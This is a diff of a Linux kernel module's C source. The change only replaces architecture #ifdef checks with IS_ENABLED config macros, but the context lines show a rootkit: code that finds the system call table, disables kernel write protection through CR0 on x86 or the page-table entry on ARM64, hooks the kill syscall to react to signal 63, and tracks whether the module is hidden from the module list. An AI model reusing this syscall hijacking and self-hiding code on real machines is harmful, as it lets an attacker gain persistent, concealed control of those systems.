@@ -7,9 +7,9 @@
 #include <linux/unistd.h>
 #include <linux/list.h>
 
-#ifdef __x86_64__
+#if IS_ENABLED(CONFIG_X86_64)
 #include <asm/paravirt.h>
-#elif __aarch64__
+#elif IS_ENABLED(CONFIG_ARM64)
 #include <asm/pgtable.h>
 #endif
 
@@ -25,7 +25,7 @@ MODULE_VERSION("0.1.0");
 /* Pointer to the memory address of the system call table */
 static unsigned long *__sys_call_table = NULL;
 
-#ifdef __aarch64__
+#if IS_ENABLED(CONFIG_ARM64)
 /* Pointer to the system call table page table entry */
 static pte_t *__sys_call_table_pte = NULL;
 #endif
@@ -55,7 +55,7 @@ static pt_regs_t orig_kill = NULL;
 static struct list_head *module_previous;
 static int module_hidden = 0;
 
-#ifdef __x86_64__
+#if IS_ENABLED(CONFIG_X86_64)
 /*
  * Modifies the Intel/AMD CR0 register state. This function is necessary
  * because write_cr0 is no longer effective.
@@ -84,7 +84,7 @@ static void protect_memory(void)
     write_cr0_forced(read_cr0() | 0x00010000);
     pr_info("Protected memory\n");
 }
-#elif __aarch64__
+#elif IS_ENABLED(CONFIG_ARM64)
 /* Unsets the PTE write protect bit */
 static void unprotect_memory(void)
 {
@@ -155,9 +155,9 @@ static pte_t *page_from_virt(unsigned long addr) {
 */
 static asmlinkage long kill_hook(const struct pt_regs *regs)
 {
-#ifdef __x86_64__
+#if IS_ENABLED(CONFIG_X86_64)
     int sig = regs->si;
-#elif __aarch64__
+#elif IS_ENABLED(CONFIG_ARM64)
     int sig = regs->regs[1];
 #endif
     if (sig == 63) {
@@ -230,7 +230,7 @@ static int __init module_start(void)
         return 1;
     }
 
-#ifdef __aarch64__
+#if IS_ENABLED(CONFIG_ARM64)
     __sys_call_table_pte = page_from_virt((unsigned long)__sys_call_table);
     if (!__sys_call_table_pte) {
         pr_info("page_from_virt could not obtain system call table PTE\n");
